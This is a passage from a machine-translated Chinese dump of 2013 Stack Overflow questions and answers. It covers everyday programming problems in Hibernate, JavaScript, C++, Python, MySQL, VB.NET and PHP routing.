    at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:106)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:204)
    at $Proxy58.fetchPageChooserWithImagesByChooser(Unknown Source)
    at com.mct.service.widgethelper.ChooserWidget.copyWidget(ChooserWidget.java:676)
    at com.mct.service.widgethelper.ChooserWidget.copyAllWidgets(ChooserWidget.java:634)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:15:10.340

您设置列表中所有对象的 ht Id：

```
abc.setId(0l); 
```

这就是导致错误的原因。您无法自行更改自动生成的 ID。

删除此行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:15:08.140

在休眠中，您不能像下面那样手动设置 Id (Autogenrated)。

```
abc.setId(0l); 
```

删除上面的这条线再试一次。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:15:50.497

问题似乎是这一行：

```
abc.setId(0l); 
```

您正在清除从数据库中加载的实体的 ID。

# javascript - Javascript原型未添加方法

> ID：15110556
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:22.137
> 
> 标签：javascript, ruby-on-rails-3, google-chrome, angularjs, prototype

我的应用程序中有以下代码：

```
app.factory('User', ['railsResourceFactory', '$http', function (railsResourceFactory, $http) {
    var res = railsResourceFactory({url: '/users', name: 'user'});

    res.prototype.hello = function () {
        return "hello";

    };

    debugger;

    return res;
}]); 
```

我正在使用[angularjs-rails-resource gem](https://github.com/tpodom/angularjs-rails-resource)。当我在 chrome 中点击调试器并在控制台中键入以下内容时：

```
res.hello() 
```

我得到：

```
TypeError: Object function RailsResource(value) { angular.extend(this, value || {}); } has no method 'hello' 
```

我不确定为什么会这样。我是一种新的 javascript，所以我可能根本不了解 Prototype。或者它可能是角度或导轨的问题。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:21:58.387

原型属性仅适用于函数。要问自己的第一个基本问题是，是否

```
railsResourceFactory({url: '/users', name: 'user'}); 
```

返回一个函数/构造函数？不，不是的。它返回一个资源对象。如果您来自经典的 OOP 语言，那么可以说原型属性仅适用于类而不适用于对象。如果您仍然希望能够访问当前正在处理的对象的原型，则可以访问它通过调用

```
object.constructor.prototype 
```

因此，您可以通过调用来实现您想要实现的目标

```
res.constructor.prototype.hello= function () {
        return "hello";

    }; 
```

# javascript - 如何在画布中复制动画

> ID：15110557
> 
> 赞同：1
> 
> 时间：2013-02-27T11:09:24.657
> 
> 标签：javascript, canvas

我有这个绘制半圆的动画，我基本上想复制它，然后将副本向下移动 60px，然后为新的添加一秒的延迟，这样它就会绘制一个“B”

html

```
<canvas id="thecanvas"></canvas> 
```

脚本

```
var can = document.getElementById('thecanvas');
ctx = can.getContext('2d');
can.width = window.innerWidth;
can.height = window.innerHeight;

window.drawCircle = function (x, y) {
    segments = 90, /* how many segments will be drawn in the space */
    currentSegment = 0,
    toRadians = function (deg) {
        return (Math.PI / 180) * deg;
    },
    getTick = function (num) {
        var tick = toRadians(180) / segments; /*360=full, 180=semi, 90=quarter... */
        return tick * num;
    },
    segment = function (end) {
        end = end || getTick(currentSegment);
        ctx.clearRect(0, 0, can.width, can.height);
        ctx.beginPath();
        ctx.arc(x, y, 60, (1.5 * Math.PI), end + (1.5 * Math.PI), false);
        ctx.stroke();
        ctx.closePath();
    };

    ctx.lineWidth = 5;
    ctx.strokeStyle = 'rgba(0,0,0,0.5)';

    setTimeout(function render() {
        segment(getTick(currentSegment));
        currentSegment += 1;
        if (currentSegment < segments) {
            setTimeout(render, 5);
        } else {
            currentTick = 0;
        }
    }, 250);
};
drawCircle(100, 100); 
```

这是一个小提琴[http://jsfiddle.net/zhirkovski/bJqdN/](http://jsfiddle.net/zhirkovski/bJqdN/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:35:25.780

首先你可以把`setTimeout`函数放在你的`drawCircle`方法之外。

那么你至少有两个选择：

1.  创建一个“endDraw”事件，该事件将在 1 次平局结束时发送。当这个事件被处理时，只需再次调用drawCircle方法。要实现这一点，当然需要一个 main 方法来调用第一个 drawCircle。

2.  为了做出更好的解决方案，您可以描述调用的工作流程。即描述要调用的方法列表以及每个方法的起始帧：

    ```
    var workflow = [{method:"drawCircle", frame:0, x:100, y:100},      //the first half circle at the frame 0, x=100, y=100
                    {method:"drawCircle", frame:1000, x:100, y:190}];  //the second half circle starting at frame 1000, x=100, y=190 
    ```

    您的主计时器将被配置为使用此数组来知道要执行的操作

# asp.net - 为什么我不能在 asp.net 中附加一个进程

> ID：15110558
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:24.377
> 
> 标签：asp.net, visual-studio-2008, iis

当我试图在 asp.net（visual studio 2008）中附加一个进程（w3wp.exe）时，我无法附加它，它显示以下错误

![附加进程时出错](../Images/07666533ce9e15123addbf449116c88b.png)

在看到这个之后，我已经修复了 Visual Studio 2008。当我尝试附加一个新错误时，我再次遇到了与上图相同的错误。
为什么会发生这种情况，我是否需要下载任何其他服务包或 Visual Studio 2008 远程调试器安装（如错误框中所述），。请帮我修复它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:33:23.710

根据[这里](http://social.msdn.microsoft.com/Forums/en-US/vssetup/thread/0528bc98-095e-4ff8-af6e-e92b89ba54ae/)，VS2008光盘上的一个名为“Remote Debugger\x64”或“WCU\RDBG\x64”的文件夹中应该有一个远程调试器设置文件。

您也可以尝试下载并安装[Visual Studio 2008 Service Pack 1 Remote Debugger](http://www.microsoft.com/en-us/download/details.aspx?id=10647)。

# css - CSS 换行问题

> ID：15110561
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:27.263
> 
> 标签：css

我有 2 个跨度并显示在 UI 中，如下所示

```
span1:The example will show you how to implement a span  (Span2) 
```

但如果我的跨度 2 长度太长，我想要如下所示

```
span1:The example will show you how to 
      implement a too long span (Span2) 
```

我应该使用什么CSS？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:20:30.003

尝试这个 `word-wrap: break-word;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:10:25.770

你可以使用：`max-width:300px;`

# image - Windows Phone 7.5 - 如何计算地图图像上的路线？

> ID：15110564
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:47.340
> 
> 标签：image, windows-phone-7, map, navigation, routes

在我的 WP7.5 应用程序中，用户可以导航到大学。他可以在地图上看到他通过扫描二维码获得的初始位置。地图图像是画布背景。一旦他选择了 X 和 Y 坐标已知的目的地，我如何在地图上绘制从用户当前位置到目的地的路线？我不知道这是否可能。

这是允许在地图上显示用户的起始位置的工作代码。

```
public void MarkLocation(ImageBrush imgmap, int posizioneX, int posizioneY)
    {
        Canvas.Background = imgmap;
        Image imgmarker = new Image();
        imgmarker.Source = new BitmapImage(new Uri("Images/marker.png", UriKind.Relative));

        Canvas.SetLeft(imgmarker, posizioneX);
        Canvas.SetTop(imgmarker, posizioneY);
        Canvas.Children.Add(imgmarker);                  

    } 
```

我希望你能帮帮我！提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:56:14.110

如果您使用[`BingMapsDirectionsTask`](http://msdn.microsoft.com/en-us/library/windowsphone/develop/hh394024%28v=vs.105%29.aspx)（在 WP7 中）或[`MapsDirectionsTask`](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj207044%28v=vs.105%29.aspx)（在 WP8 中），用户将获得完整的导航体验，包括显示路线，您无需担心动态生成图像或在地图控件上叠加项目。

# r - 如何使用 Rhipe，R 从 HDFS 中的文本文件中读取数据？

> ID：15110567
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:53.013
> 
> 标签：r, hadoop, hdfs

我是 R 的新手，Rhipe 和 Hadoop 想从内容为的文件中读取数据，

```
<Author>fallriverma
<Content>Quality hotel at great price Very clean.
<Date>Nov 25, 2008
<Rating>5   5   5   5   5   5   5   5   
<Aspects>
1   8826(grat):1    
3   3(clean):1  19(price):1 187(quality):1  
0   
0   
0   
3   0(staff):1  12(friendly):1  14(helpful):1   
3   6(breakfast):1  46(free):1  333(selection):1    
0

<Author>yondaime1845
<Content>Its the best of the best for a reason One of the more affordable and better hotels in the city of seattle.
<Date>Jan 2, 2008
<Rating>5   5   5   5   5   5   5   5   
<Aspects>
4   41(city):1  374(reason):1   762(seattle):1  1062(affordable):1  
0   
0   
4   1(location):1   66(park):1  143(cheap):1    186(convenient):1   
0   
0   
4   5(time):1   9(service):1    12(friendly):1  608(employee):1 
0 
```

我想从“8826（qrat）：1”中读取它的作者和方面值，如8826，并想使用hadoop、rhipe和R按列显示它们

希望你的建议

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T06:56:08.850

`rhls("/user/notroot/input/")`, 提供您所在位置的完整路径 -`HDFS`它会起作用

# c++ - 从析构函数传递指向 this 的共享指针

> ID：15110569
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:57.120
> 
> 标签：c++, this, destructor, shared-ptr

我有一个对象 ，`BagOfThings`它存储一组`Thing`s 和一个 s 列表`BagOfThingsListener`，它们想知道何时`Thing`添加或删除了`BagOfThings`它们已添加到的对象。像这样：

```
class Thing;
class BagOfThings;

class BagOfThingsListener {
public:
  virtual ~BagOfThingsListener() {}
  virtual void thingAdded(std::shared_ptr<BagOfThings> bag, std::shared_ptr<Thing> thing)=0;
  virtual void thingRemoved(std::shared_ptr<BagOfThings> bag, std::shared_ptr<Thing> thing)=0;
};

class BagOfThings: public enable_shared_from_this<BagOfThings> {
private:
  std::set<std::shared_ptr<Thing>> things;
  std::list<std::shared_ptr<BagOfThingsListener>> listeners;

private:
  BagOfThings() {}

public:
  static std::shared_ptr<BagOfThings> create() {
    return std::shared_ptr<BagOfThings>(new BagOfThings());
  }

  void addThing(std::shared_ptr<Thing> thing) {
    things.insert(thing);
    for (auto it=begin(listeners); it!=end(listeners); ++it) {
      (*it)->thingAdded(shared_from_this(), thing);
    }
  }

  void removeThing(std::shared_ptr<Thing> thing) {
    things.erase(thing);
    for (auto it=begin(listeners); it!=end(listeners); ++it) {
      (*it)->thingRemoved(shared_from_this(), thing);
    }
  }

  ~BagOfThings() {
    for (auto it=begin(things); it!=end(things);) {
      auto currentIt=it++;
      auto &currentThing=*currentIt;
      things.erase(currentIt);
      for (auto it2=begin(listeners); it2!=end(listeners); ++it2) {
        (*it2)->thingRemoved(shared_from_this(), currentThing);
      }
    }
  }
}; 
```

`shared_from_this()`这工作正常，除了析构函数，它是无效的，因为当所有`shared_ptr`s 都被销毁时，你不能使用，它们在调用析构函数时已经被销毁。在这种情况下，我使用的是共享指针，但在我看来，从析构函数中分发 this 指针无论如何都是有问题的——例如，有人可能会存储指针。`thingAdded`但是在这种情况下（希望让听众知道销毁所有元素的删除），如果不从听众中删除指向调用者的指针（即会变成） ，我看不到明显的好方法`void thingAdded(std::shared_ptr<Thing>)`。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:04:46.243

为什么 BagOfThingsListener::thingAdded 和 BagOfThingsListener::thingRemoved 需要取一个 shared_ptr？对 BagOfThings 的引用/常量引用还不够吗？当 BagOfThings 调用 thingAdded 或 thingRemoved 时，您知道 this 指针有效，因此引用也将有效。

# javascript - 每 3 秒触发一次“点击”事件而不点击下一个按钮？

> ID：15110577
> 
> 赞同：0
> 
> 时间：2013-02-27T11:10:14.117
> 
> 标签：javascript, jquery, slider, carousel

我在此处[http://www.edhubdemo.com/wp/](http://www.edhubdemo.com/wp/)的一个网站上设置了一个液体轮播滑块。滑块位于我们的作品和我们的客户区域下方，当前用户可以通过单击下一个/上一个按钮滚动浏览作品。现在我想要做的是每 3 秒后应该触发“点击”功能，以便滑块移动到下 4 组作品本身。我尝试使用触发功能，但我想我无法正确集成它。这是液体轮播 javascript 文件中的代码：

```
(function($){
$.fn.liquidcarousel = function(options) {

var defaults = {
    duration: 10000
};
var options = $.extend(defaults, options);

return this.each(function() {
        var divobj = $(this);

        $(divobj).css('overflow', 'hidden');

        $('> .wrapper', divobj).css('overflow', 'hidden');
        $('> .wrapper', divobj).css('float', 'left');

        $('> .wrapper > ul', divobj).css('float', 'left');
        $('> .wrapper > ul', divobj).css('margin', '0');
        $('> .wrapper > ul', divobj).css('padding', '0');
        $('> .wrapper > ul', divobj).css('display', 'block');

        $('> .wrapper > ul > li', divobj).css('display', 'block');
        $('> .wrapper > ul > li', divobj).css('float', 'left');

        var visiblelis = 0;
        var totallis = $('> .wrapper > ul > li', this).length;
        var currentposition = 0;
        var additionalmargin = 0;
        var totalwidth = 0;

        $(window).resize(function(e){
            var divwidth = $(divobj).width();
            var availablewidth = divwidth;

            var heighest = 0;
            $('> .wrapper > ul > li', divobj).css("height", "auto");
            $('> .wrapper > ul > li', divobj).each(function () {
                if ( $(this).outerHeight() > heighest ) {
                    heighest = $(this).outerHeight();
                }
            });

            $(divobj).height(heighest);
            $('> .wrapper', divobj).height(heighest);
            $('> .wrapper > ul', divobj).height(heighest);
            $('> .wrapper > ul > li', divobj).height(heighest);

            var liwidth = $('> .wrapper > ul > li:first', divobj).outerWidth(true);
            var originalmarginright = parseInt($('> .wrapper > ul > li', divobj).css('marginRight'));
            var originalmarginleft = parseInt($('> .wrapper > ul > li', divobj).css('marginLeft'));
            totalwidth = liwidth + additionalmargin;

            previousvisiblelis = visiblelis;
            visiblelis = Math.floor((availablewidth / liwidth));

            if (visiblelis < totallis) {
                additionalmargin = Math.floor((availablewidth - (visiblelis * liwidth))/visiblelis);
            } else {
                additionalmargin = Math.floor((availablewidth - (totallis * liwidth))/totallis);
            }
            halfadditionalmargin = Math.floor(additionalmargin/2);
            totalwidth = liwidth + additionalmargin;

            if (visiblelis > previousvisiblelis  || totallis <= visiblelis) {
                currentposition -= (visiblelis-previousvisiblelis);
                if (currentposition < 0 || totallis <= visiblelis ) {
                    currentposition = 0;
                }
            }
            $('> .wrapper > ul', divobj).css('marginLeft', -(currentposition * totalwidth));

            if (visiblelis >= totallis || ((divwidth >= (totallis * liwidth)) && options.hidearrows) ) {
                if (options.hidearrows) {
                    $('> .prev', $(divobj).parents(".widget")).hide();
                    $('> .next', $(divobj).parents(".widget")).hide();

                    additionalmargin = Math.floor((divwidth - (totallis * liwidth))/totallis);
                    halfadditionalmargin = Math.floor(additionalmargin/2);
                    totalwidth = liwidth + additionalmargin;
                    $('> .wrapper > ul > li', divobj).css('marginRight', originalmarginright + halfadditionalmargin);
                    $('> .wrapper > ul > li', divobj).css('marginLeft', originalmarginleft + halfadditionalmargin);
                }
                $('> .wrapper', divobj).width(totallis * totalwidth);
                $('> ul', divobj).width(totallis * totalwidth);
                $('> .wrapper', divobj).css('marginLeft', 0);
                currentposition = 0;
            } else {
                $('.prev', $(divobj).parents(".widget")).show();
                $('.next', $(divobj).parents(".widget")).show();
                $('> .wrapper', divobj).width(visiblelis * totalwidth);
                $('> ul', divobj).width(visiblelis * totalwidth);
            }
        });

        $('.next', $(divobj).parents(".widget")).click(function(){

            if (totallis <= visiblelis) {
                currentposition = 0;
            } else if ((currentposition + (visiblelis*2)) < totallis) {
                currentposition += visiblelis;
            } else if ((currentposition + (visiblelis*2)) >= totallis -1) {
                currentposition = totallis - visiblelis;
            }
            $('> .wrapper > ul', divobj).stop();
            $('> .wrapper > ul', divobj).animate({'marginLeft': -(currentposition * totalwidth)}, options.duration);

        $('.prev', $(divobj).parents(".widget")).click(function(){
            if ((currentposition - visiblelis) > 0) {
                currentposition -= visiblelis;
            } else if ((currentposition - (visiblelis*2)) <= 0) {
                currentposition = 0;
            }
            $('> .wrapper > ul', divobj).stop();
            $('> .wrapper > ul', divobj).animate({'marginLeft': -(currentposition * totalwidth)}, options.duration);
        });

        $('.next', $(divobj).parents(".widget")).dblclick(function(e){
            e.preventDefault();
            clearSelection();
        });

        $('.prev', $(divobj).parents(".widget")).dblclick(function(e){
            e.preventDefault();
            clearSelection();
        });

        function clearSelection() {
            if (document.selection && document.selection.empty) {
                document.selection.empty();
            } else if (window.getSelection) {
                var sel = window.getSelection();
                sel.removeAllRanges();
            }
        }

        $(window).resize();
}); 
```

这是单击下一个按钮时向前移动滑块的代码部分：

```
$('.next', $(divobj).parents(".widget")).click(function(){

            if (totallis <= visiblelis) {
                currentposition = 0;
            } else if ((currentposition + (visiblelis*2)) < totallis) {
                currentposition += visiblelis;
            } else if ((currentposition + (visiblelis*2)) >= totallis -1) {
                currentposition = totallis - visiblelis;
            }
            $('> .wrapper > ul', divobj).stop();
            $('> .wrapper > ul', divobj).animate({'marginLeft': -(currentposition * totalwidth)}, options.duration); 
```

这是在单击上一个按钮时使滑块向后移动的代码部分：

```
$('.prev', $(divobj).parents(".widget")).click(function(){
            if ((currentposition - visiblelis) > 0) {
                currentposition -= visiblelis;
            } else if ((currentposition - (visiblelis*2)) <= 0) {
                currentposition = 0;
            }
            $('> .wrapper > ul', divobj).stop();
            $('> .wrapper > ul', divobj).animate({'marginLeft': -(currentposition * totalwidth)}, options.duration);
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:19:32.340

*   在 jQuery 中选择你的元素

    var next = $('.next', $(divobj).parents(".widget"));

*   然后每 3 秒点击一次

    setInterval(next.click, 3000);

然而，最好的方法是为此任务创建一个函数（滑动轮播），然后通过单击调用该函数。然后您可以直接调用该函数，而不是模拟点击。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:17:03.760

`.next`通过使用模拟鼠标单击事件[`createEvent("MouseEvents")`](https://developer.mozilla.org/en-US/docs/DOM/MouseEvent)

```
$('.next', $(divobj).parents(".widget")).each(function (idx, elm) {
    var ev = document.createEvent("MouseEvents");
    ev.initMouseEvent("click", true, false, self, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    elm.dispatchEvent(ev);
}); 
```

我这样做[`.each`](http://api.jquery.com/each/)是因为一个类是非唯一的，您可能只想为第一个类调用它。

然后可以将其制成每秒钟重复一次的函数`3`，例如

```
(function (obj, waitFor) { // wrap to catch variables
    var repeatAction = function repeatAction() { // function to be given timeout (stored in variable
        obj.each(function (idx, elm) { // and named so it can reference itself; makes life easier);
            var ev = document.createEvent("MouseEvents");
            ev.initMouseEvent("click", true, false, self, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
            elm.dispatchEvent(ev);
        });
        window.setTimeout(repeatAction, waitFor); // re-invocation of itself
    };
    window.setTimeout(repeatAction, waitFor); // initial invocation
}($('.next', $(divobj).parents(".widget")), 3000)); // passing vars 
```

* * *

**编辑**：根据要求，[**将此功能插入到代码**](http://pastebin.com/jKnG43FL)中。我还尽可能地修复了语法（OP 的语法中有一些错误）并“[美化](http://jsbeautifier.org/)”了它。

# c++ - MSVS 编译器标志 /bigobj 的惩罚

> ID：15110580
> 
> 赞同：56
> 
> 时间：2013-02-27T11:10:16.217
> 
> 标签：c++, visual-studio, linker-errors

基本的 Google 搜索[bigobj 问题](https://www.google.com/search?q=bigobj+issue)表明，很多人都遇到了[致命错误 C1128](http://msdn.microsoft.com/en-us/library/8578y171.aspx)：“*节数超出目标文件格式限制：使用 /bigobj 编译*”。[如果大量使用 C++ 模板库（如Boost 库](http://www.boost.org)或[CGAL 库](http://www.cgal.org/)），则该错误更有可能发生。

这个错误很奇怪，因为它为自己提供了解决方案：设置[编译器标志`/bigobj`](http://msdn.microsoft.com/en-us/library/ms173499.aspx)！

所以这是我的问题：为什么默认情况下没有设置该标志？使用该标志必须受到惩罚，否则它将默认设置。MSDN 中没有记录该惩罚。有人有线索吗？

我问这个问题是因为我想知道[CGAL](http://www.cgal.org)的配置系统是否应该`/bigobj`默认设置。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-02-27T11:25:39.417

该文档确实提到了一个重要缺点`/bigobj`：

> 在 Visual C++ 2005 之前发布的链接器无法读取使用 .obj 生成的 .obj 文件`/bigobj`。

因此，默认设置此选项将限制可以使用生成的目标文件的链接器的数量。最好根据需要激活它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2021-10-16T04:39:43.740

> 为什么默认情况下没有设置该标志？使用该标志必须受到惩罚，否则它将默认设置。

我的快速非正式实验显示 .obj 文件`/bigobj`比没有时大 2% 左右。所以这是一个很小的惩罚，但它不是零。

有人提交了功能请求以使其`/bigobj`成为默认值；请参阅[https://developercommunity.visualstudio.com/t/Enable-bigobj-by-default/1031214](https://developercommunity.visualstudio.com/t/Enable-bigobj-by-default/1031214)。

# python - 奇怪的 python time.strftime() 时区显示

> ID：15110583
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:21.340
> 
> 标签：python, timezone, strftime

它大约是“2013-02-27 11:02”（格林威治标准时间），因为我在法国，我的当地时间大约是“2013-02-27 12:02 +0100”。我在我的机器上播放了以下命令：

```
Python 2.6.8 (unknown, Apr 14 2012, 04:15:37) 
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import time
>>> datefmt = '%Y-%m-%d %H:%M:%S %Z'
>>> paris_time = (time.gmtime(), time.localtime())
>>> paris_time[0]
time.struct_time(tm_year=2013, tm_mon=2, tm_mday=27, tm_hour=11, tm_min=2, tm_sec=2, tm_wday=2, tm_yday=58, tm_isdst=0)
>>> paris_time[1]
time.struct_time(tm_year=2013, tm_mon=2, tm_mday=27, tm_hour=12, tm_min=2, tm_sec=2, tm_wday=2, tm_yday=58, tm_isdst=0)
>>> time.strftime(datefmt, paris_time[0]), time.strftime(datefmt, paris_time[1])
('2013-02-27 11:02:02 CET', '2013-02-27 12:02:02 CET')
>>> 
```

然后我将我的机器时区更改为“纽约”并重播了最后的命令：

```
>>> paris_time[0]
time.struct_time(tm_year=2013, tm_mon=2, tm_mday=27, tm_hour=11, tm_min=2, tm_sec=2, tm_wday=2, tm_yday=58, tm_isdst=0)
>>> paris_time[1]
time.struct_time(tm_year=2013, tm_mon=2, tm_mday=27, tm_hour=12, tm_min=2, tm_sec=2, tm_wday=2, tm_yday=58, tm_isdst=0)
>>> time.strftime(datefmt, paris_time[0]), time.strftime(datefmt, paris_time[1])
('2013-02-27 11:02:02 EST', '2013-02-27 12:02:02 EST')
>>> 
```

有关信息：CET 是 +0100 的代码，EST 是 -0500 的代码。

python [time.strftime(format[, t])](http://docs.python.org/2.6/library/time.html#time.strftime)文档在表中指出：

> %Z 时区名称（如果不存在时区则无字符）。

“不存在时区”是什么意思？**struct_time 对象**中的时区（编辑：我最初在我的问题中写了“strftime 对象”）或系统中的时区？根据我的测试，我没有在对象 paris_time[x] 中设置时区，但显示了一个时区。那么，我在这里缺少什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:34:18.830

python 日期例程是（1）混乱的混乱和（2）围绕系统调用的薄包装。

在我的（linux）机器上，`man strftime`显示有关`strftime`python 例程可能包装的系统调用的信息。那里说使用了系统 TZ。这可以用[tzset 修改](http://docs.python.org/2.6/library/time.html#time.tzset)。

至于“不存在时区” - 我想这意味着当系统 TZ 未设置时。

（我不知道这是如何传递到 Windows 的。）

# mysql - 使用 MySql 数据库进行事件调度以删除过去的事件

> ID：15110584
> 
> 赞同：0
> 
> 时间：2013-02-27T11:10:26.257
> 
> 标签：mysql, database, events, scheduler

我有一个 PHP 应用程序，它允许管理员用户添加、编辑和删除新事件以供客户预订。

我想做的是在事件发生后自动删除事件。

事件表（ID、Start_Date、Course_ID、Place）中的每个事件记录都有一个开始日期，所以我基本上希望数据库每天都询问“事件表中是否有任何记录，其中今天的日期 > Start_Date”。如果有，则必须将其删除。

我一直在阅读此网页[http://www.sitepoint.com/how-to-create-mysql-events/](http://www.sitepoint.com/how-to-create-mysql-events/)以获取有关如何在 MySql 数据库上创建预定事件的信息。

但是，我正在为在哪里输入这些 MySql 命令而苦苦挣扎。我正在使用一个名为**Sequel Pro**（适用于 Mac）的程序，我唯一能看到输入这些命令的地方是在查询框中。

但是，当我输入

```
SET GLOBAL event_scheduler = ON; 
```

我收到一个错误：

```
Unknown system variable 'event_scheduler' 
```

谁能帮我？

我知道有很多基于事件调度的问题，但似乎都没有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:59:34.627

这样你就有一个可以接受的答案，以防我是对的......

也许您的主机已禁用 MySQL 中的事件调度。

# vb.net - 如何在 VB.NET 中将 16 位值拆分为两个 8 位值？

> ID：15110586
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:29.107
> 
> 标签：vb.net, 16-bit, 8-bit

我有一个像这样的 16 位值：

```
 0000000000000011 
```

我想将其拆分为两个 8 位值，例如：

```
 00000000    and    00000011 
```

16 位值是一个变量，`byte_val1`是一个无符号的 16 位整数。

如何在 VB.NET 中做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-27T11:18:03.397

您可以使用`BitConverter`该类：

```
Dim bytes As Byte() = BitConverter.GetBytes(byte_val1) 
```

现在`bytes(0)`包含低字节 (00000011) 并`bytes(1)`包含高字节 (00000000)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-27T11:13:51.017

要获得低 8 位，您需要将其与`11111111`，或`0xff`
要获得高 8 位，您需要将其与`1111111100000000`，或`0xff00`
然后进行算术左移 8 位。

好久没做Visual Basic了，不过思路是这样的：

```
word a = 1930392;
byte alower = a & 0xff;
byte ahigher = (a & 0xff00) >> 8; 
```

哦，这是我用三个名为 , 和一个按钮的文本框`a`编写`alower`的`aupper`代码`btnDoIt`：

```
Private Sub btnDoIt_Click(sender As Object, e As EventArgs) Handles btnDoIt.Click
    Dim localA = Integer.Parse(a.Text())
    Dim localALower = localA And &HFF
    Dim localAUpper = (localA And &HFF00) >> 8

    alower.Text = localALower
    aupper.Text = localAUpper
End Sub 
```

旁注：`(localA And &HFF00) >> 8`相当于`(localA >> 8) And &HFF`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-27T11:31:16.317

如果您想要任何值（32 位、64 位、128 位等）的某些字节，一个简单的位移应该可以工作。

最简单的方法是`AND`（“二进制与”，也写为“&”）源与您想要的位，然后根据需要将其移动多次以获得所需的值。

```
Dim initial as Integer = &H123456 ' Hex: 0x123456
Dim result as Byte = (initial AND &H00FF00) >> 8
'result = 0x34 
```

如果您想再次加入他们，那就更简单了：

```
Dim initial as Integer = &H123456 ' Hex: 0x123456
Dim result_a as Byte = (initial AND &H00FF00) >> 8
Dim result_b as Byte = (initial AND &HFF0000) >> 16
Dim final as Integer = (result_a << 8) or (result_b << 16)
'final = 0x123400 
```

# php - 如何从网页中获取 FLV 文件 URL

> ID：15110587
> 
> 赞同：-6
> 
> 时间：2013-02-27T11:10:30.963
> 
> 标签：php, flv, jwplayer

如何从 LIKE 网页获取 FLV 文件 URL；[http://panet.co.il/Ext/vplayer_lib.php?media=95865](http://panet.co.il/Ext/vplayer_lib.php?media=95865)

坦克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:15:25.973

如果您需要将其输出为视频 在 vplayer_lib.php 上试试这个

```
<?php
header("Content-type: video/flv");
echo file_get_contents($pathToFLV);
?> 
```

# php - 如何防止 403、400 错误 URL 转发？

> ID：15110589
> 
> 赞同：1
> 
> 时间：2013-02-27T11:10:32.340
> 
> 标签：php, http-status-code-403, http-status-code-400

当用户输入任何不存在的 url 并将请求转发到错误控制器时，站点运行良好。但

*   如果您在 url 站点中编写脚本，则抛出 403 错误
*   如果你写一些 asp 代码网站会抛出 400 错误

我怎样才能防止这种情况并将它们转发到自定义 403 和 404 页面？我尝试使用 htaccess，但我无法成功。

另一个问题：

*   如果您在地址栏中编写任何 ascii 代码，引导前进到欢迎页面（控制器 - > index.php）。怎么可能？

目录结构、htaccess 和引导代码如下。感谢您的任何帮助。

目录结构：

```
/config
/libs
   -bootstrap.php
/controllers
/models
/views
/public_html
  -index.php
   htaccess
htaccess 
```

htaccess 在主目录中

```
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteRule    ^$    public_html/    [L]
RewriteRule    (.*) public_html/$1    [L]
</IfModule> 
```

public_html 目录中的 htaccess

```
Options -Indexes

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?url=$1 [PT,L]
</IfModule> 
```

public_html 中的 index.php

```
<?php

define('DS', DIRECTORY_SEPARATOR);
define('ROOT', dirname(dirname(__FILE__)));
require_once (ROOT . DS . 'libs' . DS . 'bootstrap.php');

$app = new Bootstrap(); 
```

库中的 bootstrap.php

```
<?php

class Bootstrap {

    function __construct() {

        $url = isset($_GET['url']) ? $_GET['url'] : null;
        $url = rtrim($url, '/');
        $url = explode('/', $url);

        print_r($url);

        if (empty($url[0])) {
            require '../controllers/index.php';
            $controller = new Index();
            $controller->index();
            return false;
        }

        $file = '../controllers/' . $url[0] . '.php';
        if (file_exists($file)) {
            require $file;
        } else {
            $this->error();
            return false;
        }

        $controller = new $url[0];

        // calling methods
        if (isset($url[2])) {
            if (method_exists($controller, $url[1])) {
                $controller->{$url[1]}($url[2]);
            } else {
                $this->error();
            }
        } else {
            if (isset($url[1])) {
                if (method_exists($controller, $url[1])) {
                    $controller->{$url[1]}();
                } else {
                    $this->error();
                }
            } else {
                $controller->index();
            }
        }

    }

    function error() {
        require '../controllers/error.php';
        $controller = new Error();
        $controller->index();
        return false;
    }

} 
```

